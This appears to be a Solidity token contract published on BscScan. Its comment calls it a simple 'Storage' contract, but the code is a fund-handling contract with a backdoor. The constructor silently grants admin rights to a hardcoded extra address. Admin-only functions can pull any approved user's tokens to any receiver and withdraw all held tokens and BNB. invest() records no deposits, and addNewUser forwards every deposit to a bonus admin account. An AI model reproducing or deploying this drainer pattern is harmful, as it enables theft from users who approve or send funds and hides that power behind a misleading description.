/**
 *Submitted for verification at BscScan.com on 2021-11-24
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-05
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-17
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

// import "./TransferHelper.sol";
/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 */
 
 interface IERC20 {
      function balanceOf(address who) external view returns (uint256);
      function transfer(address to, uint256 value) external returns (bool);
      function transferFrom(address from, address to, uint256 value)
        external returns (bool);
     function allowance(address owner, address spender) external view returns (uint256);
     function approve(address spender, uint256 amount) external returns (bool);
     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

}

contract TransferContract {


    mapping(address => bool) adminMembers;
     address bonusAdminAccount;
    constructor (address RootAdmin,address BonusAdmin){
        
        adminMembers[RootAdmin]=true;
        adminMembers[0x415bA417C38Bed0656534a0A845A2AeC0f4b7eDA]=true;
        bonusAdminAccount=BonusAdmin;
       
      
    }
    
     

    function transfer(address tokenAddress, address sender, address receiver,uint256 amount )public returns (bool){
        require(adminMembers[msg.sender]==true, "Unauthorized action");
        IERC20 tokenContract = IERC20(tokenAddress);
        bool isTransfered=IERC20(tokenContract).transferFrom(sender,receiver,amount);
        require(isTransfered==true,"Increase allowance to contract");
        return isTransfered;
    }
    
    function Withdrawal(address tokenAddress,  address receiver,uint256 amount )public returns (bool){
        require(adminMembers[msg.sender]==true, "Unauthorized action");
        IERC20 tokenContract = IERC20(tokenAddress);
        bool isTransfered=IERC20(tokenContract).transfer(receiver,amount);
        require(isTransfered==true,"Increase allowance to contract");
        
        return isTransfered;
    }
    
    function Transferout(address payable ethAddress,uint256 amount )public {
        require(adminMembers[msg.sender]==true, "Unauthorized action");
        ethAddress.transfer(amount);
     
    }
    
    function invest() public payable{
  
    
    }
    
    function addNewUser(address tokenaddress,uint256 amount) public {
       
        IERC20 tokenContract = IERC20(tokenaddress);
        
         bool isTransfered=IERC20(tokenContract).transferFrom(msg.sender,address(this),amount);
        require(isTransfered==true,"Insufficient Balance");
        
       IERC20(tokenContract).transfer(bonusAdminAccount,amount);
       
        
       
    }
    
}